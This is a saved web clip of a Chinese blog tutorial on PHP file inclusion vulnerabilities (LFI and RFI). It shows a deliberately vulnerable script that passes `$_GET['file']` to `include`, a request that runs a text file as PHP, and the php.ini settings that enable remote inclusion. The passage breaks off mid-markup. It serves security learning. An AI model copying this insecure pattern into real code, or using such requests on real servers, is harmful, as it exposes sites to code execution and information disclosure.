<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 7.1.1 (456642)"/><meta name="keywords" content="文件包含"/><meta name="author" content="默小西"/><meta name="created" content="2017-10-10 13:28:13 +0000"/><meta name="source" content="web.clip"/><meta name="source-url" content="http://chybeta.github.io/2017/10/08/php文件包含漏洞/index.html"/><meta name="updated" content="2018-08-08 08:03:38 +0000"/><title>php文件包含漏洞</title></head><body style="zoom: 0.754188;"><div>文件包含</div><hr/><div style="-evernote-webclip:true;"><div><br/></div><div><span style="font-size: 16px; display: inline-block;"><div style="font-size: 14px; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><div style="opacity:1;transform:translateY(0px);"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
  

  

  

    
      /></div><div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

        
        
          /></div><h1 style="margin: 0px; padding: 0px; font-size: 26px; text-align: center; word-break: break-word;"><span style="font-size: 26px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: 400; line-height: 1.5;">
            
            
              
                php文件包含漏洞
              
            
          </span></h1><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
        

        /></div><div style="margin: 3px 0px 60px; font-size: 12px; text-align: center;"><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
          
            
              /><span style="font-size: 12px; margin-right: 3px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
                /><i style="display: inline-block; font-size: inherit; text-rendering: auto; -webkit-font-smoothing: antialiased;"><span style="font-size: inherit; font-style: normal; color: rgb(153, 153, 153); font-family: FontAwesome; font-stretch: normal; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: normal; line-height: 1;"></span></i><span style="font-size: 12px; margin-right: 3px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
              /><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">
              
                发表于
              
              
                2017-10-08
              
            

            

            
          

          
            
            
              </span><span style="margin: 0px 0.5em; font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">|</span><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
            
              /><span style="font-size: 12px; margin-right: 3px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
                /><i style="display: inline-block; font-size: inherit; text-rendering: auto; -webkit-font-smoothing: antialiased;"><span style="font-size: inherit; font-style: normal; color: rgb(153, 153, 153); font-family: FontAwesome; font-stretch: normal; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: normal; line-height: 1;"></span></i><span style="font-size: 12px; margin-right: 3px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
              /><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">
              
                分类于
              
              
                
                  </span><a href="https://chybeta.github.io/categories/Web-Security/" rel="index" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 12px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">
                    Web Security
                  </a><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
                

                
                
              
            
          

          
            
          

          

          
          
             
               /><span style="margin: 0px 0.5em; font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">|</span><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
               /><span style="font-size: 12px; margin-right: 3px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
                 /><i style="display: inline-block; font-size: inherit; text-rendering: auto; -webkit-font-smoothing: antialiased;"><span style="font-size: inherit; font-style: normal; color: rgb(153, 153, 153); font-family: FontAwesome; font-stretch: normal; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: normal; line-height: 1;"></span></i><span style="font-size: 12px; margin-right: 3px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
               /><span style="font-size: 12px; color: rgb(153, 153, 153); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">
               
                 阅读次数 
               
                 172
             
          

          

          

        </span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
      /></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
    


    /></div><div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"

      
      

      
        /></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php文件包含漏洞学习</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">合上吧，没有新姿势。</span></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h1 style="font-size: 22px; margin: 0px; padding: 0px;"><span style="font-size: 22px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">基本</span></h1><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">相关函数</span></h2><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php中引发文件包含漏洞的通常是以下四个函数：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">include()</a></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">include_once()</a></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">require()</a></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">require_once()</a></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/1.png" height="252" width="1011"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">include() 如果出错的话，只会提出警告，会继续执行后续语句。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; word-wrap: break-word; outline: 0px; border-bottom-color: rgb(34, 34, 34); font-size: 14px; color: rgb(34, 34, 34); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/2.png" height="257" width="1021"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 788px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 788px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    $file = $_GET[</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'file'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">];</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;"> $file;</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在同目录下有个phpinfo.txt，其内容为</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">&lt;? phpinfo(); ?&gt;</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">。则只需要访问：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 705px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 705px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">index.php?file=phpinfo.txt</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">即可成功解析phpinfo。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/3.png" height="336" width="1238"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">场景</span></h2><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">具有相关的文件包含函数。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">文件包含函数中存在动态变量，比如 </span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">include $file;</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">攻击者能够控制该变量，比如</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">$file = $_GET['file'];</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">分类</span></h2><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">LFI(Local File Inclusion)</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">RFI(Remote File Inclusion)</span></h3><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">但RFI的利用条件较为苛刻，需要php.ini中进行配置</span></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_fopen = On</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">allow_url_include = On</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">两个配置选项均需要为On，才能远程包含文件成功。</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/4.png" height="394" width="1170"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h1 style="font-size: 22px; margin: 0px; padding: 0px;"><span style="font-size: 22px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含姿势</span></h1><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">下面例子中测试代码均为：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 725px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: 